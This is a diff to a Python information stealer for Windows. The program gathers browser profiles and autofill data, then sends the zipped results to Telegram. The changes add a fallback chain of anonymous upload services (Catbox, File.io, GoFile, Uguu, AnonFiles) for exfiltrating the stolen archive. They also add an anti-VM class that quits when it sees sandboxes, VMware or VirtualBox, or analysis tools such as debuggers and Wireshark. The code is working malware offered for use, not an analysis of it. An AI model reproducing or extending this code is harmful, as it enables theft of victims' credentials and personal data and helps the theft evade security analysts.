@@ -9,10 +9,13 @@ import shutil
 import sqlite3
 import requests
 import platform
-
+import psutil # type: ignore
+import win32api # type: ignore
 
 from pathlib import Path
 from ctypes import *
+from urllib.request import urlopen
+from json import loads
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes # type: ignore
 from cryptography.hazmat.backends import default_backend # type: ignore
 
@@ -28,7 +31,10 @@ async def error_handler() -> None:
         file.write(f"Type : {exc_type.__name__}\n")
         file.write(f"Message : {exc_value}\n")
         tb = exc_traceback
-        while tb.tb_next:tb = tb.tb_next
+
+        while tb.tb_next:
+            tb = tb.tb_next
+
         file.write(f"Fichier : {tb.tb_frame.f_code.co_filename}\n")
         file.write(f"Ligne : {tb.tb_lineno}\n\n")
         
@@ -111,7 +117,7 @@ class Main:
             asyncio.create_task(self.GetAutoFills()),
             ]
         await asyncio.gather(*taskk)
-        await self.WriteToText()
+        await self.InsideFolder()
         await self.SendAllData()
     async def list_profiles(self) -> None:
         try:
@@ -391,7 +397,7 @@ class Main:
                 requests.post(send_document_url, data=document_payload, files={'document': open(filePath + ".zip", 'rb')})
             
             else:
-                succes = await UploadFiles.upload_gofile(filePath + ".zip")
+                succes = await UploadFiles.upload_file(filePath + ".zip")
 
                 if succes is not None:
                     text = f"<b>{platform.node()} - File Link</b>\n\n<b>{succes}</b>"
@@ -431,41 +437,226 @@ class Main:
         
 class UploadFiles:
     @staticmethod
-    async def GetServer() -> str:
+    async def getserver() -> str:
         try:
-            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
+            async with aiohttp.ClientSession() as session:
                 async with session.get("https://api.gofile.io/getServer") as request:
                     data = await request.json()
                     return data["data"]["server"]
         except aiohttp.ClientError as e:
-            error_handler(f"An error occurred: {type(e).__name__} - {str(e)}")
+            error_handler(f"An error occurred while fetching GoFile server: {type(e).__name__} - {str(e)}")
             return "store1"
 
     @staticmethod
-    async def upload_gofile(file_path: str) -> str:
+    async def upload_gofile(path: str) -> str:
         try:
-            ActiveServer = await UploadFiles.GetServer()
-            upload_url = f"https://{ActiveServer}.gofile.io/uploadFile"
+            server = await UploadFiles.getserver()
+
             async with aiohttp.ClientSession() as session:
-                file_form = aiohttp.FormData()
-                file_form.add_field('file', open(file_path, 'rb'), filename=os.path.basename(file_path))
+                with open(path, 'rb') as file:
+                    form = aiohttp.FormData()
+                    form.add_field('file', file, filename=os.path.basename(path))
 
-                async with session.post(upload_url, data=file_form) as response:
-                    response_body = await response.text()
-                    raw_json = json.loads(response_body)
-                    download_page = raw_json['data']['downloadPage']
-                    return download_page
-        except aiohttp.ClientError as e:
-            error_handler(f"An error occurred: {type(e).__name__} - {str(e)}")
-            return None
+                    async with session.post(f'https://{server}.gofile.io/uploadFile', data=form) as response:
+                        data = await response.json()
+                        return data["data"]["downloadPage"]
         except Exception as e:
-            error_handler(f"An error occurred: {type(e).__name__} - {str(e)}")
+            error_handler(f"An error occurred with GoFile (aiohttp): {e}")
             return None
 
+    @staticmethod
+    async def upload_catbox(path: str) -> str:
+        try:
+            async with aiohttp.ClientSession() as session:
+                with open(path, 'rb') as file:
+                    form = aiohttp.FormData()
+                    form.add_field('fileToUpload', file, filename=os.path.basename(path))
+                    form.add_field('reqtype', 'fileupload')
+                    form.add_field('userhash', '')
+
+                    async with session.post('https://catbox.moe/user/api.php', data=form) as response:
+                        result = await response.text()
+                        return result
+        except Exception as e:
+            error_handler(f"An error occurred while uploading to Catbox: {type(e).__name__} - {str(e)}")
+            return None
+
+    @staticmethod
+    async def upload_fileio(path: str) -> str:
+        try:
+            async with aiohttp.ClientSession() as session:
+                with open(path, 'rb') as file:
+                    form = aiohttp.FormData()
+                    form.add_field('file', file, filename=os.path.basename(path))
+
+                    async with session.post('https://file.io/', data=form) as response:
+                        if response.status == 200:
+                            data = await response.json()
+                            return data.get("link")
+                        else:
+                            error_handler(f"File.io upload failed with status: {response.status}")
+                            return None
+        except Exception as e:
+            error_handler(f"An error occurred while uploading to File.io: {type(e).__name__} - {str(e)}")
+            return None
+
+    @staticmethod
+    async def upload_uguu(path: str) -> str:
+        try:
+            async with aiohttp.ClientSession() as session:
+                with open(path, 'rb') as file:
+                    form = aiohttp.FormData()
+                    form.add_field('file', file, filename=os.path.basename(path))
+
+                    async with session.post('https://uguu.se/api.php?d=upload', data=form) as response:
+                        data = await response.json()
+                        return data.get("url")
+        except Exception as e:
+            error_handler(f"An error occurred while uploading to Uguu: {type(e).__name__} - {str(e)}")
+            return None
+
+    @staticmethod
+    async def upload_anonfiles(path: str) -> str:
+        try:
+            async with aiohttp.ClientSession() as session:
+                with open(path, 'rb') as file:
+                    form = aiohttp.FormData()
+                    form.add_field('file', file, filename=os.path.basename(path))
+
+                    async with session.post('https://api.anonfiles.com/upload', data=form) as response:
+                        data = await response.json()
+                        return data["data"]["file"]["url"]["full"]
+        except Exception as e:
+            error_handler(f"An error occurred while uploading to AnonFiles: {type(e).__name__} - {str(e)}")
+            return None
+
+    @staticmethod
+    async def upload_file(file_path: str) -> str:
+        upload_attempts = [
+            ('Catbox', UploadFiles.upload_catbox),
+            ('File.io', UploadFiles.upload_fileio),
+            ('GoFile', UploadFiles.upload_gofile),
+            ('Uguu', UploadFiles.upload_uguu),
+            ('AnonFiles', UploadFiles.upload_anonfiles),
+        ]
+        
+        for platform, upload_method in upload_attempts:
+            try:
+                result = await upload_method(file_path)
+                if result:
+                    return result
+            except Exception as e:
+                error_handler(f"An error occurred with {platform}: {type(e).__name__} - {str(e)}")
+                continue
+        
+        return "All upload attempts failed."
+
+class anti_vm:
+    async def run_all_fonctions(self) -> None:
+        tasks = [
+            asyncio.create_task(self.check_disk_space()),
+            asyncio.create_task(self.check_recent_files()),
+            asyncio.create_task(self.check_process_count()),
+            asyncio.create_task(self.check_virtual_memory()),
+            asyncio.create_task(self.check_for_virtualization()),
+            asyncio.create_task(self.check_for_suspicious_files()),
+            asyncio.create_task(self.check_system_manufacturer())
+        ]
+        try:
+            await asyncio.gather(*tasks)
+        except Exception:
+            error_handler()
+
+    async def check_disk_space(self) -> bool:
+        try:
+            total_disk_space_gb = sum(psutil.disk_usage(drive.mountpoint).total for drive in psutil.disk_partitions()) / (1024 ** 3)
+            if total_disk_space_gb < 50:
+                ctypes.windll.kernel32.ExitProcess(0)
+            min_disk_space_gb = 50
+            if len(sys.argv) > 1:
+                min_disk_space_gb = float(sys.argv[1])
+            free_space_gb = win32api.GetDiskFreeSpaceEx()[1] / 1073741824
+            if free_space_gb < min_disk_space_gb:
+                ctypes.windll.kernel32.ExitProcess(0)
+        except Exception:
+            error_handler()
+
+    async def check_recent_files(self) -> bool:
+        try:
+            recent_files_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Recent')
+            if len(os.listdir(recent_files_folder)) < 20:
+                ctypes.windll.kernel32.ExitProcess(0)
+        except Exception:
+            error_handler()
+
+    async def check_process_count(self) -> None:
+        try:
+            if len(psutil.pids()) < 50:
+                ctypes.windll.kernel32.ExitProcess(0)
+        except Exception:
+            error_handler()
+
+    async def check_virtual_memory(self) -> None:
+        try:
+            total_memory_gb = psutil.virtual_memory().total / (1024 ** 3)
+            if total_memory_gb < 6:
+                ctypes.windll.kernel32.ExitProcess(0)
+        except Exception:
+            error_handler()
+
+    async def check_for_virtualization(self) -> None:
+        try:
+            process = await asyncio.create_subprocess_shell('wmic path win32_VideoController get name',stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE,shell=True)
+            stdout, stderr = await process.communicate()
+            video_controller_info = stdout.decode(errors='ignore').splitlines()
+            if any(x.lower() in video_controller_info[2].strip().lower() for x in ("virtualbox", "vmware")):
+                ctypes.windll.kernel32.ExitProcess(0)
+        except Exception:
+            error_handler()
+
+    async def check_for_suspicious_files(self) -> None:
+        try:
+            temp_file_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Temp', 'JSAMSIProvider64.dll')
+            if os.path.exists(temp_file_path):
+                ctypes.windll.kernel32.ExitProcess(0)
+            try:
+                machine_name = platform.uname().machine.lower()
+                if "dady harddisk" in machine_name or "qemu harddisk" in machine_name:
+                    ctypes.windll.kernel32.ExitProcess(0)
+            except AttributeError:
+                pass
+
+            suspicious_process_names = ["32dbg", "64dbgx", "autoruns", "autoruns64", "autorunsc", "autorunsc64", "ciscodump", "df5serv", "die", "dumpcap", "efsdump", "etwdump", "fakenet", "fiddler", "filemon", "hookexplorer", "httpdebugger", "httpdebuggerui", "ida", "ida64", "idag", "idag64", "idaq", "idaq64", "idau", "idau64", "idaw", "immunitydebugger", "importrec", "joeboxcontrol", "joeboxserver", "ksdumperclient", "lordpe", "ollydbg", "pestudio", "petools", "portmon", "prl_cc", "prl_tools", "proc_analyzer", "processhacker", "procexp", "procexp64", "procmon", "procmon64", "qemu-ga", "qga", "regmon", "reshacker", "resourcehacker", "sandman", "sbiesvc", "scylla", "scylla_x64", "scylla_x86", "sniff_hit", "sysanalyzer", "sysinspector", "sysmon", "tcpdump", "tcpview", "tcpview64", "udpdump", "vboxcontrol", "vboxservice", "vboxtray", "vgauthservice", "vm3dservice", "vmacthlp", "vmsrvc", "vmtoolsd", "vmusrvc", "vmwaretray", "vmwareuser", "vt-windows-event-stream", "windbg", "wireshark", "x32dbg", "x64dbg", "x96dbg", "xenservice"]
+          
+            running_processes = [
+                process.name().lower() for process in psutil.process_iter(attrs=['name']) 
+                if process.name().lower() in suspicious_process_names
+            ]
+            if running_processes:
+                ctypes.windll.kernel32.ExitProcess(0)
+        except Exception:
+            error_handler()
+
+    async def check_system_manufacturer(self) -> None:
+        try:
+            process1 = await asyncio.create_subprocess_shell('wmic computersystem get Manufacturer',stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE,shell=True)
+            stdout1, stderr1 = await process1.communicate()
+
+            process2 = await asyncio.create_subprocess_shell('wmic path Win32_ComputerSystem get Manufacturer',stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE,shell=True)
+            stdout2, stderr2 = await process2.communicate()
+
+            if b'VMware' in stdout1 or b"vmware" in stdout2.lower():
+                ctypes.windll.kernel32.ExitProcess(0)
+        except Exception:
+            error_handler()
 
         
 if __name__ == '__main__':
     if os.name == "nt":
-        asyncio.run(Main().RunAllFonctions())
+        anti = anti_vm()
+        asyncio.run(anti.run_all_fonctions())
+
+        main = get_data()
+        asyncio.run(main.RunAllFonctions())
     else:
         print('run only on windows operating system')
